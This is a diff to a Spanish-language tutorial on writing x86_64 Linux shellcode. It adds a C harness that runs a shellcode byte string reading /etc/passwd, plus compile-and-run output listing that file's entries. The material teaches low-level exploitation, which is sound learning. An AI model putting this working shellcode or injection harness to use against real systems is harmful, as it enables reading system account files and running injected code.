@@ -216,8 +216,8 @@ Hello wolrd!
 
 ##### **Ejemplo leer fichero en 64 bits**
 
-Como nuestro shellcode o bytecode lo usamos para ejecutarse dentro de otro programa, no tiene que tener ninguna sección .data en el código ensamblador, por eso es necesario utilizar la técnica jmp-call descrita en el anterior ejemplo.
-Veamos como se construye el shellcode para leer el fichero /etc/passwd en un entorno x86_64 linux. Si tenemos este código de ensamblador:
+
+Veamos como se construye el shellcode para leer el fichero /etc/passwd en un entorno x86_64 linux. Tenemos este código de ensamblador:
 
 ```asm
 BITS64
@@ -348,6 +348,30 @@ for i in `objdump -d readfile | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$
 \xeb\x3b\x5f\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xc0\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64
 ```
 
+Si inyectamos nuestro shellcode o bytecode en otro programa de C, quedaría de la siguiente manera:
+
+```
+const char code[] = "\xeb\x3b\x5f\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xc0\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64";
+
+int main(int argc, char **argv)
+{
+    (*(void(*)())code)();
+
+    return 0;
+}
+
+```
+
+Ahora sólo tendremos que compilarlo y ver como nuestro shellcode inyectado funciona:
+
+```
+gcc test2.c -o test2 
+./test2
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+```
 
 *That's all folks!*
 
